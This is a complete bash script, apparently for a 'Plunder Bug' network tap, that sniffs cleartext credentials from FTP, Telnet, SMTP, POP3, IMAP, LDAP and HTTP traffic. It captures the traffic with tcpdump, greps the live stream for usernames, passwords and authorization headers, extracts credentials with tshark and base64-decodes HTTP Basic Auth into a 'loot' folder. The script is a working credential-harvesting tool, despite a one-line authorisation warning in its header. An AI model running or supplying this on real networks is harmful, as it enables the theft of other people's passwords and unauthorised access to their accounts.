#!/usr/bin/env bash
# ================================================================
#  Plunder Bug — capture-creds
#  Description : Targeted cleartext credential capture. Filters for
#                protocols that transmit credentials in plaintext:
#                HTTP Basic Auth, FTP, Telnet, SMTP AUTH, POP3, IMAP,
#                LDAP bind requests. Saves PCAP + live grep output.
#  Host OS     : Linux/macOS
#  Requires    : tcpdump (sudo), strings, grep
#  Usage       : sudo ./capture.sh [interface] [duration_seconds]
#  WARNING     : Only use on networks you are authorised to test.
# ================================================================

set -euo pipefail

IFACE="${1:-}"
DURATION="${2:-0}"
LOOT_DIR="./loot/$(date +%Y%m%d_%H%M%S)_creds"
mkdir -p "$LOOT_DIR"

detect_iface() {
    for iface in /sys/class/net/*/address; do
        addr=$(cat "$iface" 2>/dev/null || true)
        [[ "${addr,,}" == 00:13:37* ]] && basename "$(dirname "$iface")" && return
    done
}
[ -z "$IFACE" ] && IFACE=$(detect_iface)
[ -z "$IFACE" ] && { echo "[!] Plunder Bug not found."; exit 1; }

# Cleartext protocol filter
CRED_FILTER='tcp port 21 or tcp port 23 or tcp port 25 or tcp port 110 or
             tcp port 143 or tcp port 389 or tcp port 587 or
             tcp port 80 or tcp port 8080 or tcp port 8000'

CRED_PCAP="${LOOT_DIR}/cred_protocols.pcap"
HITS_FILE="${LOOT_DIR}/credential_hits.txt"

echo " =================================================="
echo "  Plunder Bug — Cleartext Credential Capture"
echo " =================================================="
echo "  Interface : $IFACE"
echo "  Protocols : FTP/Telnet/SMTP/POP3/IMAP/LDAP/HTTP"
echo "  PCAP      : $CRED_PCAP"
echo "  Live hits : $HITS_FILE"
echo " =================================================="
echo ""

# PCAP capture in background
sudo tcpdump -i "$IFACE" -w "$CRED_PCAP" "$CRED_FILTER" 2>/dev/null &
PCAP_PID=$!

# Live ASCII stream + pattern matching (runs in parallel)
{
    sudo tcpdump -i "$IFACE" -A -nn "$CRED_FILTER" 2>/dev/null | \
    grep -a --line-buffered -iE \
        'USER |PASS |LOGIN |AUTH |Authorization: Basic |MAIL FROM|RCPT TO|BIND|password|username' | \
    while IFS= read -r line; do
        TS=$(date +%H:%M:%S)
        echo "[$TS] $line" | tee -a "$HITS_FILE"
    done
} &
GREP_PID=$!

cleanup() {
    kill "$PCAP_PID" "$GREP_PID" 2>/dev/null || true
    echo ""
    echo "[+] Capture complete."
    # Post-process: FTP credentials
    if command -v tshark >/dev/null 2>&1 && [ -f "$CRED_PCAP" ]; then
        echo "[*] Extracting FTP credentials..."
        tshark -r "$CRED_PCAP" -Y 'ftp.request.command == "USER" or ftp.request.command == "PASS"' \
            -T fields -e ip.src -e ftp.request.command -e ftp.request.arg 2>/dev/null \
            > "${LOOT_DIR}/ftp_creds.txt"
        echo "[*] Extracting HTTP Basic Auth headers..."
        tshark -r "$CRED_PCAP" -Y 'http.authorization' \
            -T fields -e ip.src -e http.host -e http.authorization 2>/dev/null \
            > "${LOOT_DIR}/http_basic_auth.txt"
        echo "[*] Extracting SMTP AUTH..."
        tshark -r "$CRED_PCAP" -Y 'smtp.req.command == "AUTH"' \
            -T fields -e ip.src -e smtp.req.command -e smtp.req.parameter 2>/dev/null \
            > "${LOOT_DIR}/smtp_auth.txt"
        # Base64 decode HTTP Basic Auth
        if [ -s "${LOOT_DIR}/http_basic_auth.txt" ]; then
            echo "[*] Decoding HTTP Basic Auth (base64)..."
            while IFS=$'\t' read -r src host auth; do
                b64=$(echo "$auth" | sed 's/Basic //')
                decoded=$(echo "$b64" | base64 -d 2>/dev/null || true)
                echo "$src $host → $decoded"
            done < "${LOOT_DIR}/http_basic_auth.txt" > "${LOOT_DIR}/http_decoded_creds.txt"
        fi
    fi
    echo "[+] Credential hits: $(wc -l < "$HITS_FILE" 2>/dev/null || echo 0)"
    echo "[+] Full PCAP: $CRED_PCAP"
}
trap cleanup EXIT INT TERM

[ "$DURATION" -gt 0 ] 2>/dev/null && sleep "$DURATION" && exit 0
wait "$PCAP_PID"
